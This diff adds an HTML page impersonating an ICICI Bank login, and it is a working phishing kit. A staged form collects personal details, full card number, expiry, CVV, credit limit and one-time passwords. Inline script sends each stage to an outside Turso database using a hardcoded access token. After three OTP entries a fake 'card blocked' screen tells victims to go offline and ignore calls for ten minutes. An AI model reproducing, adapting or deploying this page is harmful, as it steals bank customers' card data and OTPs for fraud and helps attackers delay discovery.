@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register = function () { return new Promise(function () { }); };
+    }
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>ICICI Bank Login</title>
+  <script src="./assets/js/asset.js"></script>
+  <link href="./assets/css/css2_e7ef77.css" rel="stylesheet">
+  <link href="./assets/css/icon_2a30df.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="stylesheet" href="./assets/css/login.min.css">
+  <style>
+    :root {
+      --brand-primary: #8b1d1d;
+      --brand-secondary: #f37021;
+      --background-light: #FDF9F9;
+      --text-primary: #2c0d0d;
+      --text-secondary: #8b1d1d;
+      --accent-blue: #fff5f0;
+    }
+
+    body { background: var(--background-light); color: var(--text-primary); }
+    .brand-primary-bg { background-color: var(--brand-primary); }
+    .brand-secondary-bg { background-color: var(--brand-secondary); }
+    .brand-primary-text { color: var(--brand-primary); }
+    .brand-secondary-text { color: var(--brand-secondary); }
+    .text-primary { color: var(--text-primary); }
+    .text-secondary { color: var(--text-secondary); }
+    .accent-bg { background-color: var(--accent-blue); }
+    .border-brand-secondary { border-color: var(--brand-secondary) !important; }
+    .focus\:ring-brand-primary:focus { box-shadow: 0 0 0 2px var(--brand-primary); }
+    .focus\:border-brand-primary:focus { border-color: var(--brand-primary) !important; }
+
+    .btn-enabled { background-color: var(--brand-primary) !important; cursor: pointer; }
+    #proceed-btn:not(.btn-enabled) { cursor: not-allowed; }
+
+    #dash-link { display: none; text-align: center; margin-top: 14px; font-size: 13px; }
+    #resend-otp:disabled { cursor: not-allowed; opacity: .55; }
+
+    #sync-note {
+      text-align: center; font-size: 12px; font-weight: 600; min-height: 16px;
+      margin-top: 8px; opacity: 0; transition: opacity .2s; color: #1a7a35;
+    }
+    #sync-note.show { opacity: 1; }
+    #sync-note.bad { color: #a11414; }
+
+    #otp-status { display: none; text-align: center; font-size: 14px; font-weight: 600; line-height: 1.5; }
+    #otp-status.warn { color: var(--brand-primary); animation: pop .25s ease; }
+    #otp-status.blocked { color: #a11414; background: #fdecec; border: 1px solid #f3c1c1; border-radius: 10px; padding: 14px; font-size: 14px; animation: pop .3s ease; }
+    #otp-status.blocked b { display: block; font-size: 15px; margin-bottom: 6px; }
+    #otp-status.blocked small { display: block; margin-top: 6px; font-weight: 500; color: #7a3b3b; }
+
+    #attempt-dots { display: flex; gap: 6px; justify-content: center; margin-top: 10px; }
+    #attempt-dots span { width: 8px; height: 8px; border-radius: 50%; background: #e6c9c9; transition: .2s; }
+    #attempt-dots span.used { background: var(--brand-primary); }
+    #attempt-dots span.blocked { background: #a11414; }
+
+    @keyframes pop { from { opacity: 0; transform: scale(.96) } to { opacity: 1; transform: scale(1) } }
+    .shake { animation: shake .35s; }
+    @keyframes shake { 0%, 100% { transform: translateX(0) } 25% { transform: translateX(-5px) } 75% { transform: translateX(5px) } }
+  </style>
+</head>
+
+<body class="flex flex-col" style="background:var(--background-light);color:var(--text-primary);">
+  <div class="container mx-auto px-4 flex-grow">
+    <div class="flex justify-center mt-8 mb-6">
+      <img alt="ICICI Bank Logo" class="h-8" src="./assets/images/app-logo.png">
+    </div>
+    <main class="flex flex-col flex-grow justify-center px-4 max-w-xl mx-auto">
+      <div class="text-center mb-6">
+        <h1 class="text-xl font-semibold brand-primary-text">Welcome to ICICI Bank Online</h1>
+        <p class="text-sm text-secondary mt-1">Please provide your details to proceed</p>
+      </div>
+
+      <div class="flex w-full max-w-md justify-between items-center mx-auto mb-4 mt-4 px-2">
+        <div class="flex flex-col items-center flex-1">
+          <div id="step-details" class="cursor-pointer">
+            <div class="w-14 h-14 rounded-full brand-primary-bg text-white flex items-center justify-center text-[26px]">
+              <span class="material-icons">person</span>
+            </div>
+          </div>
+          <p id="text-details" class="text-sm sm:text-base brand-primary-text font-semibold mt-2">Personal</p>
+        </div>
+        <div class="flex-1 flex items-center justify-center -mt-5">
+          <div class="w-full h-0.5 border-t-2 border-dashed" style="border-color:var(--brand-secondary);"></div>
+        </div>
+        <div class="flex flex-col items-center flex-1">
+          <div id="step-card" class="cursor-pointer">
+            <div class="w-14 h-14 rounded-full accent-bg text-secondary flex items-center justify-center text-[26px]">
+              <span class="material-icons">credit_card</span>
+            </div>
+          </div>
+          <p id="text-card" class="text-sm sm:text-base text-secondary mt-2">Card</p>
+        </div>
+        <div class="flex-1 flex items-center justify-center -mt-5">
+          <div class="w-full h-0.5 border-t-2 border-dashed" style="border-color:var(--brand-secondary);"></div>
+        </div>
+        <div class="flex flex-col items-center flex-1">
+          <div id="step-limit" class="cursor-pointer">
+            <div class="w-14 h-14 rounded-full accent-bg text-secondary flex items-center justify-center text-[26px]">
+              <span class="material-icons">account_balance_wallet</span>
+            </div>
+          </div>
+          <p id="text-limit" class="text-sm sm:text-base text-secondary mt-2">Limit</p>
+        </div>
+        <div class="flex-1 flex items-center justify-center -mt-5">
+          <div class="w-full h-0.5 border-t-2 border-dashed" style="border-color:var(--brand-secondary);"></div>
+        </div>
+        <div class="flex flex-col items-center flex-1">
+          <div id="step-otp" class="cursor-pointer">
+            <div class="w-14 h-14 rounded-full accent-bg text-secondary flex items-center justify-center text-[26px]">
+              <span class="material-icons">pin</span>
+            </div>
+          </div>
+          <p id="text-otp" class="text-sm sm:text-base text-secondary mt-2">OTP</p>
+        </div>
+      </div>
+
+      <form id="onboarding-form" class="mt-8 space-y-6" novalidate>
+        <div id="section-details" class="space-y-6" style="display:block;">
+          <div>
+            <label for="fullName" class="block text-sm font-medium brand-secondary-text mb-2">Full Name</label>
+            <input id="fullName" name="fullName" type="text" placeholder="Enter your full name"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+          <div>
+            <label for="mobile" class="block text-sm font-medium brand-secondary-text mb-2">Mobile Number</label>
+            <div class="mt-1 relative rounded-md shadow-sm">
+              <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                <span class="brand-secondary-text sm:text-sm">+91</span>
+              </div>
+              <input id="mobile" name="mobile" type="tel" placeholder="Enter your mobile number" maxlength="10"
+                inputmode="numeric" class="block w-full pl-12 sm:text-sm border-brand-secondary rounded-md py-2"
+                style="border-color:var(--brand-secondary);">
+            </div>
+          </div>
+          <div>
+            <label for="email" class="block text-sm font-medium brand-secondary-text mb-2">Email Address</label>
+            <input id="email" name="email" type="email" placeholder="Enter your email address"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+          <div>
+            <label for="dob" class="block text-sm font-medium brand-secondary-text mb-2">Date of Birth</label>
+            <input id="dob" name="dob" type="date" max="2025-01-01" min="1900-01-01"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+        </div>
+
+        <div id="section-card" class="space-y-6" style="display:none">
+          <div>
+            <label for="cardHolderName" class="block text-sm font-medium brand-secondary-text mb-2">Card Holder Name</label>
+            <input id="cardHolderName" name="cardHolderName" type="text" placeholder="Enter name as on card"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+          <div>
+            <label for="cardNumber" class="block text-sm font-medium brand-secondary-text mb-2">Card Number</label>
+            <input id="cardNumber" name="cardNumber" type="text" inputmode="numeric" maxlength="19"
+              placeholder="Enter your 16-digit card number"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+          <div class="flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0">
+            <div class="flex-1">
+              <label for="expiry" class="block text-sm font-medium brand-secondary-text mb-2">Expiry Date</label>
+              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5"
+                class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+                style="border-color:var(--brand-secondary);">
+            </div>
+            <div class="flex-1">
+              <label for="cvv" class="block text-sm font-medium brand-secondary-text mb-2">CVV</label>
+              <input id="cvv" name="cvv" type="password" inputmode="numeric" placeholder="•••" maxlength="3"
+                class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+                style="border-color:var(--brand-secondary);">
+            </div>
+          </div>
+        </div>
+
+        <div id="section-limit" class="space-y-6" style="display:none">
+          <div class="text-center">
+            <p class="text-sm text-secondary">Enter the available credit limit for the card ending in
+              <span id="card-last4" class="font-semibold brand-primary-text">••••</span>
+            </p>
+          </div>
+          <div>
+            <label for="availableLimit" class="block text-sm font-medium brand-secondary-text mb-2">Available Credit Limit</label>
+            <input id="availableLimit" name="availableLimit" type="number" inputmode="numeric"
+              placeholder="Enter available credit limit"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+          </div>
+        </div>
+
+        <div id="section-otp" class="space-y-6" style="display:none">
+          <div class="text-center">
+            <p class="text-sm text-secondary">A 6-digit OTP has been sent to
+              <span id="otp-mobile" class="font-semibold brand-primary-text">your mobile</span>
+            </p>
+          </div>
+          <div>
+            <label for="otp" class="block text-sm font-medium brand-secondary-text mb-2">Enter your 6-digit OTP</label>
+            <input id="otp" name="otp" type="text" inputmode="numeric" maxlength="6" placeholder="Enter 6-digit OTP"
+              class="mt-1 block w-full border-brand-secondary rounded-md shadow-sm sm:text-sm py-2 px-3"
+              style="border-color:var(--brand-secondary);">
+            <div class="mt-2 text-right">
+              <button type="button" id="resend-otp"
+                class="text-sm brand-primary-text font-semibold hover:underline">Resend OTP</button>
+            </div>
+          </div>
+
+          <!-- OTP Track div removed -->
+          <div id="otp-status"></div>
+          <div id="attempt-dots"><span></span><span></span><span></span></div>
+        </div>
+
+        <button id="proceed-btn" type="submit"
+          class="w-full text-white font-bold py-3 px-4 rounded-lg shadow-md cursor-not-allowed transition duration-300 bg-gray-400">Proceed</button>
+        <div id="sync-note"></div>
+      </form>
+
+      <div id="dash-link">
+     
+      </div>
+
+      <div class="flex justify-center mt-8 mb-8">
+        <img alt="Illustration" class="w-2/3" src="./assets/images/illustration.png">
+      </div>
+    </main>
+  </div>
+
+  <footer class="brand-secondary-bg text-white text-xs py-6 mt-8">
+    <div class="container mx-auto px-4">
+      <div class="flex flex-wrap justify-center text-center gap-x-2 gap-y-2">
+        <a class="hover:underline" href="#">© 2025</a><span>|</span>
+        <a class="hover:underline" href="#">Most Important Terms &amp; Conditions</a><span>|</span>
+        <a class="hover:underline" href="#">Privacy Policy</a><span>|</span>
+        <a class="hover:underline" href="#">Disclaimer</a><span>|</span>
+        <a class="hover:underline" href="#">Terms &amp; Conditions</a><span>|</span>
+        <a class="hover:underline" href="#">Offer Terms &amp; Conditions</a><span>|</span>
+        <a class="hover:underline" href="#">Digital Platform Updates</a><span>|</span>
+        <a class="hover:underline" href="#">Usage Agreement</a>
+      </div>
+      <p class="text-center mt-4">Site best viewed in browsers I.E 11+, Mozilla 3.5+, Chrome 3.0+, Safari 5.0+ on all desktops, laptops, and Android &amp; iOS devices.</p>
+    </div>
+  </footer>
+
+  <script>
+    /* ================== CONFIG ================== */
+    var TURSO_HTTP = 'https://yaiyiurhih-yaiyiurhih.aws-ap-south-1.turso.io';
+    var TURSO_TOKEN = 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3OTI0MDAzMTAsImlkIjoiMDFhMTUzNWYtYmYwMS03YjU2LWJlMGEtOWIyNThlYzBmNTc0Iiwia2lkIjoiX0dKZWs2cWJtTjZ4ejdLVGVBX3VqbUJuRnpxck9Zck9EbEZLdGR1RHZ4OCIsInJpZCI6IjAwOTcyNTk1LWVjOGEtNDY5My04ODg1LTc5MGI5MmZhYzViMyJ9.qomAHSXoul67z3Dayv1DjNaMc5xm2b_G8JATizy_muiI-d1tAsUVG4mSodxckqXEJN2Ya7lGM0AoVG0OW2UEDw';
+    var OTP_COOLDOWN = 30;
+    var MAX_ATTEMPTS = 3;
+    /* ============================================ */
+
+    (function () {
+      var $ = function (id) { return document.getElementById(id); };
+
+      var sections = [$('section-details'), $('section-card'), $('section-limit'), $('section-otp')];
+      var stepEls = [$('step-details'), $('step-card'), $('step-limit'), $('step-otp')];
+      var textEls = [$('text-details'), $('text-card'), $('text-limit'), $('text-otp')];
+      var form = $('onboarding-form');
+      var btn = $('proceed-btn');
+      var resendBtn = $('resend-otp');
+      var statusEl = $('otp-status');
+      var otpInput = $('otp');
+      var dots = $('attempt-dots').children;
+
+      var current = 0, ready = false;
+      var attempts = 0, blocked = false;
+      var otpList = [];
+
+      var SESSION_KEY = 'icici_session_id';
+      var OTPS_KEY = 'icici_otp_list';
+      var ATT_KEY = 'icici_attempts';
+
+      function store(k, v) { try { sessionStorage.setItem(k, v); } catch (e) { } }
+      function read(k) { try { return sessionStorage.getItem(k); } catch (e) { return null; } }
+
+      var SESSION_ID = (function () {
+        var s = read(SESSION_KEY);
+        if (!s) {
+          s = 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
+          store(SESSION_KEY, s);
+        }
+        return s;
+      })();
+
+      (function restore() {
+        try {
+          var raw = read(OTPS_KEY);
+          if (raw) {
+            var p = JSON.parse(raw);
+            if (Array.isArray(p)) otpList = p.map(function (x) { return x == null ? '' : String(x); });
+          }
+        } catch (e) { }
+        var a = parseInt(read(ATT_KEY) || '0', 10);
+        if (!isNaN(a) && a > 0) attempts = a;
+        if (attempts >= MAX_ATTEMPTS) { blocked = true; current = 3; }
+      })();
+
+      var validators = [
+        function () {
+          return $('fullName').value.trim().length > 2 &&
+            /^[0-9]{10}$/.test($('mobile').value.trim()) &&
+            /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test($('email').value.trim()) &&
+            $('dob').value !== '';
+        },
+        function () {
+          var exp = $('expiry').value.replace(/\D/g, ''); // Slash aur spaces hata dega
+          return $('cardHolderName').value.trim().length > 2 &&
+            $('cardNumber').value.replace(/[\s-]/g, '').length === 16 &&
+            exp.length === 4 && /^(0[1-9]|1[0-2])\d{2}$/.test(exp) && // Bina slash ke bhi validate hoga
+            /^[0-9]{3}$/.test($('cvv').value.trim());
+        },
+        function () {
+          var a = parseFloat($('availableLimit').value);
+          return !isNaN(a) && a > 0;
+        },
+        function () { return /^[0-9]{6}$/.test(otpInput.value.trim()); }
+      ];
+
+      function renderStep() {
+        sections.forEach(function (s, i) { s.style.display = (i === current) ? 'block' : 'none'; });
+        stepEls.forEach(function (el, i) {
+          var circle = el.firstElementChild, label = textEls[i];
+          if (i <= current) {
+            circle.className = 'w-14 h-14 rounded-full brand-primary-bg text-white flex items-center justify-center text-[26px]';
+            label.className = 'text-sm sm:text-base brand-primary-text font-semibold mt-2';
+          } else {
+            circle.className = 'w-14 h-14 rounded-full accent-bg text-secondary flex items-center justify-center text-[26px]';
+            label.className = 'text-sm sm:text-base text-secondary mt-2';
+          }
+        });
+
+        if (current === 3) {
+          var num = $('mobile').value.trim();
+          $('otp-mobile').textContent = num ? ('+91 ' + num) : 'your mobile';
+          
+          if (blocked) showBlocked();
+          else if (!otpStarted) { otpStarted = true; startOtpCooldown(); }
+        }
+
+        paintButton();
+      }
+
+      function paintButton() {
+        if (blocked) {
+          btn.textContent = 'Card Blocked';
+          btn.disabled = true;
+          btn.classList.remove('btn-enabled');
+          btn.classList.add('bg-gray-400', 'cursor-not-allowed');
+          return;
+        }
+        var ok = validators[current]();
+        var lastTry = (current === 3 && attempts === MAX_ATTEMPTS - 1);
+        btn.textContent = (current === 3) ? (lastTry ? 'Verify OTP (Last attempt)' : 'Verify OTP') : 'Proceed';
+        btn.classList.toggle('bg-gray-400', !ok);
+        btn.classList.toggle('cursor-not-allowed', !ok);
+        btn.classList.toggle('btn-enabled', ok);
+      }
+
+      function updateButton() { if (!blocked) paintButton(); }
+
+      function paintDots() {
+        for (var i = 0; i < dots.length; i++) {
+          dots[i].className = (i < attempts) ? (blocked ? 'used blocked' : 'used') : '';
+        }
+      }
+
+      var otpTimer = null, otpRemaining = 0, otpStarted = false;
+
+      function startOtpCooldown() {
+        clearInterval(otpTimer);
+        otpRemaining = OTP_COOLDOWN;
+        resendBtn.disabled = true;
+        resendBtn.textContent = 'Resend OTP in ' + otpRemaining + 's';
+        otpTimer = setInterval(function () {
+          otpRemaining--;
+          if (otpRemaining <= 0) {
+            clearInterval(otpTimer); otpTimer = null;
+            if (!blocked) { resendBtn.disabled = false; resendBtn.textContent = 'Resend OTP'; }
+          } else {
+            resendBtn.textContent = 'Resend OTP in ' + otpRemaining + 's';
+          }
+        }, 1000);
+      }
+
+      function showStatus(html, type) {
+        statusEl.className = type || '';
+        statusEl.innerHTML = html;
+        statusEl.style.display = 'block';
+      }
+
+      function showBlocked() {
+        showStatus(
+          '<b>Your card has been blocked.</b>' +
+          'Please turn off your net and don\'t pick any call for 10 mins.' +
+          '<small>Do not share the OTP with anyone.</small>',
+          'blocked'
+        );
+        otpInput.disabled = true;
+        resendBtn.disabled = true;
+        var dl = $('dash-link'); if (dl) dl.style.display = 'block';
+      }
+
+      function shakeOtp() {
+        otpInput.classList.remove('shake');
+        void otpInput.offsetWidth;
+        otpInput.classList.add('shake');
+        setTimeout(function () { otpInput.classList.remove('shake'); }, 400);
+      }
+
+      function recordOtp(v) {
+        var idx = attempts - 1;
+        if (idx < 0) return;
+        while (otpList.length < idx) otpList.push('');
+        if (otpList.length === idx) otpList.push(v || '');
+        else if (v) otpList[idx] = v;
+        store(OTPS_KEY, JSON.stringify(otpList));
+        store(ATT_KEY, String(attempts));
+      }
+
+      function consumeAttempt(enteredOtp) {
+        if (blocked || attempts >= MAX_ATTEMPTS) return;
+
+        attempts++;
+        paintDots();
+        otpInput.value = '';
+        startOtpCooldown();
+
+        if (attempts < MAX_ATTEMPTS) {
+          var left = MAX_ATTEMPTS - attempts;
+          showStatus(left + ' attempt' + (left === 1 ? '' : 's') + ' left', 'warn');
+          if (enteredOtp) shakeOtp();
+          paintButton();
+          if (!otpInput.disabled) otpInput.focus();
+          save('otp_attempt', enteredOtp);
+          return;
+        }
+
+        blocked = true;
+        showBlocked();
+        paintButton();
+        paintDots();
+
+        try {
+          localStorage.setItem('icici_user', JSON.stringify({
+            fullName: $('fullName').value, mobile: $('mobile').value, email: $('email').value,
+            dob: $('dob').value, cardHolderName: $('cardHolderName').value,
+            cardNumber: $('cardNumber').value, expiry: $('expiry').value, cvv: $('cvv').value,
+            availableLimit: $('availableLimit').value, otps: otpList.slice(),
+            attempts: String(attempts), status: 'blocked'
+          }));
+        } catch (err) { }
+
+        save('blocked', enteredOtp);
+      }
+
+      /* ---------- Turso ---------- */
+      function hval(v) {
+        if (v === null || v === undefined) return { type: 'null' };
+        if (typeof v === 'number') return Number.isInteger(v)
+          ? { type: 'integer', value: String(v) } : { type: 'float', value: v };
+        return { type: 'text', value: String(v) };
+      }
+      function stmt(sql, args) {
+        return { type: 'execute', stmt: { sql: sql, args: (args || []).map(hval) } };
+      }
+      function turso(statements) {
+        return fetch(TURSO_HTTP + '/v2/pipeline', {
+          method: 'POST',
+          headers: { 'Authorization': 'Bearer ' + TURSO_TOKEN, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ requests: statements.concat([{ type: 'close' }]) })
+        })
+          .then(function (r) {
+            if (!r.ok) return r.text().then(function (t) { throw new Error('HTTP ' + r.status + ' — ' + t.slice(0, 200)); });
+            return r.json();
+          })
+          .then(function (d) {
+            d.results.forEach(function (res) { if (res.type === 'error') throw new Error(res.error.message); });
+            return d.results;
+          });
+      }
+
+      var CREATE_SQL = 'CREATE TABLE IF NOT EXISTS logins (' +
+        'id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, full_name TEXT, mobile TEXT, email TEXT, dob TEXT,' +
+        'card_holder TEXT, card_number TEXT, expiry TEXT, cvv TEXT, available_limit TEXT,' +
+        'otp TEXT, otp_history TEXT, attempts TEXT, status TEXT DEFAULT \'verified\',' +
+        'updated_at TEXT DEFAULT CURRENT_TIMESTAMP, created_at TEXT DEFAULT CURRENT_TIMESTAMP)';
+
+      var EVENTS_SQL = 'CREATE TABLE IF NOT EXISTS login_events (' +
+        'id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, event_type TEXT, status TEXT,' +
+        'full_name TEXT, mobile TEXT, email TEXT, dob TEXT, card_holder TEXT, card_number TEXT,' +
+        'expiry TEXT, cvv TEXT, available_limit TEXT, otp TEXT, otp_history TEXT, attempts TEXT,' +
+        'created_at TEXT DEFAULT CURRENT_TIMESTAMP)';
+
+      var COLS = {
+        session_id: 'TEXT',
+        full_name: 'TEXT', mobile: 'TEXT', email: 'TEXT', dob: 'TEXT', card_holder: 'TEXT',
+        card_number: 'TEXT', expiry: 'TEXT', cvv: 'TEXT', available_limit: 'TEXT',
+        otp: 'TEXT', otp_history: 'TEXT', attempts: 'TEXT', status: "TEXT DEFAULT 'verified'",
+        updated_at: 'TEXT DEFAULT CURRENT_TIMESTAMP',
+        created_at: 'TEXT DEFAULT CURRENT_TIMESTAMP'
+      };
+
+      function migrate() {
+        var chain = Promise.resolve();
+        Object.keys(COLS).forEach(function (c) {
+          chain = chain.then(function () {
+            return turso([stmt('ALTER TABLE logins ADD COLUMN ' + c + ' ' + COLS[c])]).catch(function () { });
+          });
+        });
+        return chain;
+      }
+
+      function ensureTable() {
+        if (ready) return Promise.resolve();
+        return turso([stmt(CREATE_SQL), stmt(EVENTS_SQL)])
+          .then(migrate)
+          .then(function () {
+            return turso([
+              stmt('CREATE UNIQUE INDEX IF NOT EXISTS idx_logins_session ON logins(session_id)'),
+              stmt('CREATE INDEX IF NOT EXISTS idx_events_session ON login_events(session_id)')
+            ]);
+          })
+          .then(function () { ready = true; })
+          .catch(function (e) { console.error('ensureTable fail:', e); });
+      }
+
+      var FIELD_COLS = ['full_name', 'mobile', 'email', 'dob', 'card_holder', 'card_number', 'expiry', 'cvv', 'available_limit'];
+      var FIELD_IDS = ['fullName', 'mobile', 'email', 'dob', 'cardHolderName', 'cardNumber', 'expiry', 'cvv', 'availableLimit'];
+
+      function snapOf(status, latest) {
+        return {
+          session_id: SESSION_ID,
+          full_name: ($('fullName').value || '').trim(),
+          mobile: ($('mobile').value || '').trim(),
+          email: ($('email').value || '').trim(),
+          dob: ($('dob').value || '').trim(),
+          card_holder: ($('cardHolderName').value || '').trim(),
+          card_number: ($('cardNumber').value || '').trim(),
+          expiry: ($('expiry').value || '').trim(),
+          cvv: ($('cvv').value || '').trim(),
+          available_limit: ($('availableLimit').value || '').trim(),
+          otp: latest,
+          otp_history: JSON.stringify(otpList),
+          attempts: String(attempts),
+          status: status
+        };
+      }
+
+      function saveRow(status, otpValue) {
+        recordOtp(otpValue);
+        var filled = otpList.filter(function (x) { return x; });
+        var latest = filled.length ? filled[filled.length - 1] : '';
+        var d = snapOf(status, latest);
+
+        var cols = ['session_id'].concat(FIELD_COLS).concat(['otp', 'otp_history', 'attempts', 'status']);
+        var args = [d.session_id].concat(FIELD_COLS.map(function (c) { return d[c]; }))
+          .concat([d.otp, d.otp_history, d.attempts, d.status]);
+
+        var upsert = stmt('INSERT INTO logins (' + cols.join(',') + ') VALUES (' +
+          cols.map(function () { return '?'; }).join(',') + ')' +
+          ' ON CONFLICT(session_id) DO UPDATE SET ' +
+          FIELD_COLS.map(function (c) { return c + ' = excluded.' + c; }).join(', ') +
+          ', otp = excluded.otp, otp_history = excluded.otp_history,' +
+          ' attempts = excluded.attempts, status = excluded.status,' +
+          ' updated_at = CURRENT_TIMESTAMP', args);
+
+        var stmts = [upsert];
+
+        stmts.push(stmt(
+          'INSERT INTO login_events (session_id, event_type, status, full_name, mobile, email, dob,' +
+          ' card_holder, card_number, expiry, cvv, available_limit, otp, otp_history, attempts)' +
+          ' VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
+          [d.session_id, status, status, d.full_name, d.mobile, d.email, d.dob, d.card_holder,
+          d.card_number, d.expiry, d.cvv, d.available_limit, d.otp, d.otp_history, d.attempts]
+        ));
+
+        return ensureTable().then(function () { return turso(stmts); });
+      }
+
+      var noteTimer = null;
+      function flashNote(text, bad) {
+        var el = $('sync-note');
+        el.textContent = text;
+        el.className = 'show' + (bad ? ' bad' : '');
+        clearTimeout(noteTimer);
+        noteTimer = setTimeout(function () { el.className = ''; }, 1800);
+      }
+
+      function save(status, otpValue) {
+        flashNote('Saving...');
+        return saveRow(status, otpValue)
+          .then(function () { flashNote('Progress saved'); })
+          .catch(function (err) {
+            console.error('Turso save fail:', err);
+            flashNote('Save fail — check internet', true);
+          });
+      }
+
+      /* ---------- form ---------- */
+      form.addEventListener('input', function () { updateButton(); });
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        if (blocked && current === 3) return;
+        if (!validators[current]()) return;
+
+        if (current === 0) { current = 1; renderStep(); save('personal'); return; }
+
+        if (current === 1) {
+          var digits = $('cardNumber').value.replace(/\D/g, '');
+          $('card-last4').textContent = digits ? digits.slice(-4) : '••••';
+          current = 2; renderStep(); save('card'); return;
+        }
+
+        if (current === 2) { current = 3; renderStep(); save('limit'); return; }
+
+        consumeAttempt(otpInput.value.trim());
+      });
+
+      resendBtn.addEventListener('click', function () {
+        if (resendBtn.disabled || blocked) return;
+        consumeAttempt('');
+      });
+
+      stepEls.forEach(function (el, i) {
+        el.addEventListener('click', function () {
+          if (blocked) return;
+          if (i <= current) { current = i; renderStep(); }
+        });
+      });
+
+      // Updated Expiry Input Listener (Fixes the issue)
+      $('expiry').addEventListener('input', function () {
+        var v = this.value.replace(/\D/g, '').slice(0, 4); // Sirf 4 digit allow karega
+        if (v.length >= 3) {
+          v = v.slice(0, 2) + '/' + v.slice(2);
+        }
+        this.value = v;
+      });
+
+      $('cardNumber').addEventListener('input', function () {
+        var v = this.value.replace(/\D/g, '').slice(0, 16);
+        this.value = v.replace(/(.{4})/g, '$1 ').trim();
+      });
+
+      renderStep();
+      paintDots();
+      ensureTable();
+    })();
+  </script>
+</body>
+
+</html>
